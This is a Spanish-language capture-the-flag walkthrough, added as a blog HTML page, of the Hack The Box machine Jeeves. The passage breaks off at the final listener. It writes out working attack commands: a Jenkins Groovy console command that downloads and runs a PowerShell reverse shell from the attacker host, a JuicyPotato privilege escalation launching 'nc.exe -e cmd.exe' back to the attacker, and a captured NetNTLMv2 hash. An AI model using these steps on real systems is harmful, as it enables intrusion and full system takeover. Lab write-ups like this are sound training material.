@@ -1,0 +1,983 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Jeeves - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Jeeves en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Jeeves">
+<meta property="og:url" content="http://localhost:4000/htb-jeeves/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Jeeves en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-jeeves/jeeves.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-10-11T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-jeeves/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Jeeves</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Inteligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Jeeves">
+    <meta itemprop="description" content="Resolución de la máquina Jeeves en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="October 11, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Jeeves
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-10-11T00:00:00-05:00">October 11, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-jeeves/banner-jeeves.jpg" alt="" /></p>
+
+<h2 id="jeeves">Jeeves</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.63.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.63
+PING 10.10.10.63 <span class="o">(</span>10.10.10.63<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.63: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>136 ms
+
+<span class="nt">---</span> 10.10.10.63 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 136.230/136.230/136.230/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.63 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-09 00:42 CDT
+Initiating SYN Stealth Scan at 00:42
+Scanning 10.10.10.63 <span class="o">[</span>65535 ports]
+Discovered open port 445/tcp on 10.10.10.63
+Discovered open port 80/tcp on 10.10.10.63
+Discovered open port 135/tcp on 10.10.10.63
+Discovered open port 50000/tcp on 10.10.10.63
+Completed SYN Stealth Scan at 00:42, 26.41s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.63
+Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-10-09 00:42:20 CDT <span class="k">for </span>27s
+Not shown: 65531 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE      REASON
+80/tcp    open  http         syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+50000/tcp open  ibm-db2      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>26.49 seconds
+           Raw packets sent: 131084 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 22 <span class="o">(</span>968B<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬───────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.63
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 80,135,445,50000
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p80</span>,135,445,50000 10.10.10.63 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-10-09 00:43 CDT
+Nmap scan report <span class="k">for </span>10.10.10.63
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft IIS httpd 10.0
+|_http-title: Ask Jeeves
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+135/tcp   open  msrpc        Microsoft Windows RPC
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+|_http-title: Error 404 Not Found
+|_http-server-header: Jetty<span class="o">(</span>9.4.z-SNAPSHOT<span class="o">)</span>
+Service Info: Host: JEEVES<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 5h04m47s, deviation: 0s, median: 5h04m47s
+| smb2-time: 
+|   <span class="nb">date</span>: 2021-10-09T10:48:46
+|_  start_date: 2021-10-09T10:44:41
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>50.18 seconds
+</code></pre></div></div>
+
+<p>Observamos que se encuentra abierto el puerto 445 asociado al servicio de SMB, por lo que podríamos probar si podemos listar recursos del sistema:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.63 <span class="nt">-N</span>
+session setup failed: NT_STATUS_ACCESS_DENIED
+❯ smbmap <span class="nt">-H</span> 10.10.10.63
+<span class="o">[!]</span> Authentication error on 10.10.10.63
+</code></pre></div></div>
+
+<p>No tenemos permisos para ver recursos. Ahora vemos que tenemos servicios HTTP corriendo a través de los puertos 80 y 50000, así que vamos a checarlos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.63/
+http://10.10.10.63/ <span class="o">[</span>200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.63], Microsoft-IIS[10.0], Title[Ask Jeeves]
+❯ whatweb http://10.10.10.63:50000/
+http://10.10.10.63:50000/ <span class="o">[</span>404 Not Found] Country[RESERVED][ZZ], HTTPServer[Jetty<span class="o">(</span>9.4.z-SNAPSHOT<span class="o">)]</span>, IP[10.10.10.63], Jetty[9.4.z-SNAPSHOT], PoweredBy[Jetty://], Title[Error 404 Not Found]
+</code></pre></div></div>
+
+<p>Vemos el uso de <em>Microsoft IIS 10.0</em> a través del puerto 80 y un código de estado 404 para el puerto 50000.</p>
+
+<p><img src="/assets/images/htb-jeeves/jeeves-web.png" alt="" /></p>
+
+<p><img src="/assets/images/htb-jeeves/jeeves-web1.png" alt="" /></p>
+
+<p>Como no vemos nada interesante, vamos a buscar recursos en los sitios web. Vamos a empezar por el puerto 50000 debido a que es un puerto muy alto con el servicio HTTP:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">-t</span> 500 <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.63:50000/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work co
+rrectly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.63:50000/FUZZ                                                                                            
+Total requests: 220560                                                                                                           
+                                                                                                                                 
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                         
+=====================================================================                         
+
+000041607:   302        0 L      0 W        0 Ch        "askjeeves"                                                     
+^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
+                                
+Total time: 0   
+Processed Requests: 74106
+Filtered Requests: 74105                                        
+Requests/sec.: 0
+</span></code></pre></div></div>
+
+<p>Tenemos el recurso <code class="language-plaintext highlighter-rouge">askjeeves</code>, así que vamos a echarle un ojo:</p>
+
+<p><img src="/assets/images/htb-jeeves/jeeves-askjeeves.png" alt="" /></p>
+
+<p>Vemos el uso de la herramienta <strong>Jenkins</strong>, así que vamos a buscar un posible exploit asociado a dicha tecnología y especificamente, un exploit que nos permita ejecución de comandos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit jenkins <span class="nb">command </span>execution
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Jenkins 2.150.2 - Remote Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                                        | linux/webapps/46352.rb
+Jenkins CI Script Console - Command Execution <span class="o">(</span>Metasploit<span class="o">)</span>                                     | multiple/remote/24206.rb
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>De los resultados observados, vamos a echarle un ojo al archivo <code class="language-plaintext highlighter-rouge">multiple/remote/24206.rb</code> para ver que realiza. Tenemos que se debe de tener un recurso denominado <code class="language-plaintext highlighter-rouge">script</code> en donde posiblemente podemos ejecutar comandos a nivel de sistema; por lo que vamos a ver.</p>
+
+<p><img src="/assets/images/htb-jeeves/jeeves-groovy.png" alt="" /></p>
+
+<p>Investigando un poco sobre <strong><em>Groovy script</em></strong>, identificamos dos recursos que nos indican como podríamos ejecutar comandos a nivel de sistema y nos podria ayudar:</p>
+
+<ul>
+  <li><a href="https://onekilo79.wordpress.com/2016/03/31/jenkins-console-script-with-power/">onekilo79.wordpress.com</a></li>
+  <li><a href="https://groovy-lang.gitlab.io/101-scripts/basico/command_local-en.html">groovy-lang.gitlab.io</a></li>
+</ul>
+
+<p>Por lo el ejecutar los siguiente ya tenemos ejecución de comando a nivel de sistema:</p>
+
+<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span> <span class="o">=</span> <span class="s2">"whoami"</span>
+<span class="n">cmd</span><span class="o">.</span><span class="na">execute</span><span class="o">().</span><span class="na">text</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-jeeves/jeeves-cmd.png" alt="" /></p>
+
+<p>Ahora debemos ingresar al sistema, por lo que buscamos el archivo <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp</code> en nuestra máquina y lo copiamos a nuestro directorio de trabajo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ locate Invoke-PowerShellTcp
+/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1
+/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1
+/usr/share/nishang/Shells/Invoke-PowerShellTcpOneLineBind.ps1
+❯ <span class="nb">cp</span> /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 PS.ps1
+</code></pre></div></div>
+
+<p>Y agregamos al final del archivo la siguiente linea</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerShellTcp <span class="nt">-Reverse</span> <span class="nt">-IPAddress</span> 10.10.14.17 <span class="nt">-Port</span> 443
+</code></pre></div></div>
+
+<p>Nos compartimos un servidor HTTP con python, nos ponemos en escucha a través del puerto 443 y nos entablamos una reverse shell:</p>
+
+<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd</span> <span class="o">=</span> <span class="s2">"C:\\Windows\\SysNative\\WindowsPowershell\\v1.0\\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.17/PS.ps1')"</span>
+<span class="n">cmd</span><span class="o">.</span><span class="na">execute</span><span class="o">().</span><span class="na">text</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
+Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
+10.10.10.63 - - <span class="o">[</span>10/Oct/2021 13:54:25] <span class="s2">"GET /PS.ps1 HTTP/1.1"</span> 200 -
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.10.14.17] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.63] 49678
+Windows PowerShell running as user kohsuke on JEEVES
+Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+</span>jeeves<span class="se">\k</span>ohsuke
+PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\.</span>jenkins&gt;
+</code></pre></div></div>
+
+<p>Ya nos encontramos dentro de la máquina como el usuario <strong>kohsuke</strong> y podemos visualizar la flag (user.txt).  Como utilizamos la ruta nativa de powershell, deberíamos tenermos un proceso igual que la architectura del sistema; esto lo podemos probar con los siguientes comandos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\.</span>jenkins&gt; <span class="o">[</span>Environment]::Is64BitOperatingSystem
+True
+PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\.</span>jenkins&gt; <span class="o">[</span>Environment]::Is64BitProcess
+True
+PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\.</span>jenkins&gt;
+</code></pre></div></div>
+
+<p>En este punto nos queda escalar privilegios, así que vamos a enumerar un poco el sistema:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami</span> /priv
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                               State   
+<span class="o">=============================</span> <span class="o">=========================================</span> <span class="o">========</span>
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set            </span>Disabled
+SeTimeZonePrivilege           Change the <span class="nb">time </span>zone                      Disabled
+PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\.</span>jenkins&gt;
+</code></pre></div></div>
+
+<p>Vemos que tenemos el permiso <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> habilitado, por lo que ya debemos estar pensando en <strong>Juicy Potato</strong>; asi que nos lo descargamos:</p>
+
+<p><a href="https://github.com/ohpe/juicy-potato/releases">Juicy Potato</a></p>
+
+<p>Y lo pasamos a nuestro directorio de trabajo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cp</span> /home/k4miyo/Descargas/Firefox/JuicyPotato.exe <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Así mismo, buscamos el archivo <code class="language-plaintext highlighter-rouge">nc.exe</code> en nuestra máquina y lo copiamos en nuestro directorio de trabajo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ locate nc.exe
+/usr/share/sqlninja/apps/nc.exe
+❯ <span class="nb">cp</span> /usr/share/sqlninja/apps/nc.exe <span class="nb">.</span>
+</code></pre></div></div>
+
+<p>Ahora transferimos los archivos a la máquina víctima mediate un recurso compartido y en un directorio en donde tengamos permisos: <code class="language-plaintext highlighter-rouge">C:\Windows\Temp</code> y nos creamos el directorio <code class="language-plaintext highlighter-rouge">Privesc</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.63,49679<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>JEEVES<span class="se">\k</span>ohsuke,JEEVES<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\k</span>ohsuke authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> kohsuke::JEEVES:aaaaaaaaaaaaaaaa:031bce5f76d7906c9b6a6dc84df5b549:010100000000000080430a58d8bed701ba69bc758a1c267f0000000001001000460048006f0056004e004a006100470003001000460048006f0056004e004a006100470002001000670068007a005700530041007a00530004001000670068007a005700530041007a0053000700080080430a58d8bed701060004000200000008003000300000000000000000000000003000009452c393bb1aa4a1dcf86e8b7bdc4e817dc77f66558d27ad6325a928dcbc47e70a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0032003400000000000000000000000000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.10.10.63,49679<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt;mkdir Privesc
+
+
+    Directory: C:<span class="se">\W</span>indows<span class="se">\T</span>emp
+
+
+Mode                LastWriteTime         Length Name                                                                  
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
+d-----       10/11/2021   8:46 PM                Privesc                                                               
+
+
+PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp&gt;cd Privesc
+PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; copy <span class="se">\\</span>10.10.14.24<span class="se">\s</span>mbFolder<span class="se">\J</span>uicyPotato.exe JP.exe
+PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; copy <span class="se">\\</span>10.10.14.24<span class="se">\s</span>mbFolder<span class="se">\n</span>c.exe nc.exe
+PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc
+
+
+Mode                LastWriteTime         Length Name                                                                  
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
+<span class="nt">-a----</span>       10/11/2021   3:34 PM         347648 JP.exe                                                                
+<span class="nt">-a----</span>       10/11/2021   3:38 PM          28160 nc.exe                                                                
+
+
+PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt;
+</code></pre></div></div>
+
+<p>Ahora si ejecutamos nuestro archivo con el argumento <code class="language-plaintext highlighter-rouge">-a</code> para que nos entable una reverse shell, por lo que nos ponemos en escucha por puerto 443:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc<span class="se">\J</span>P.exe
+JuicyPotato v0.1 
+
+Mandatory args: 
+<span class="nt">-t</span> createprocess call: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;<span class="k">*</span><span class="o">&gt;</span> try both
+<span class="nt">-p</span> &lt;program&gt;: program to launch
+<span class="nt">-l</span> &lt;port&gt;: COM server listen port
+
+
+Optional args: 
+<span class="nt">-m</span> &lt;ip&gt;: COM server listen address <span class="o">(</span>default 127.0.0.1<span class="o">)</span>
+<span class="nt">-a</span> &lt;argument&gt;: <span class="nb">command </span>line argument to pass to program <span class="o">(</span>default NULL<span class="o">)</span>
+<span class="nt">-k</span> &lt;ip&gt;: RPC server ip address <span class="o">(</span>default 127.0.0.1<span class="o">)</span>
+<span class="nt">-n</span> &lt;port&gt;: RPC server listen port <span class="o">(</span>default 135<span class="o">)</span>
+<span class="nt">-c</span> &lt;<span class="o">{</span>clsid<span class="o">}&gt;</span>: CLSID <span class="o">(</span>default BITS:<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">})</span>
+<span class="nt">-z</span> only <span class="nb">test </span>CLSID and print token<span class="s1">'s user
+PS C:\Windows\Temp\Privesc&gt; 
+PS C:\Windows\Temp\Privesc&gt; C:\Windows\Temp\Privesc\JP.exe -t * -p C:\Windows\System32\cmd.exe -l 4444 -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd.exe 10.10.14.24 443"
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 4444
+......
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+PS C:\Windows\Temp\Privesc&gt;
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
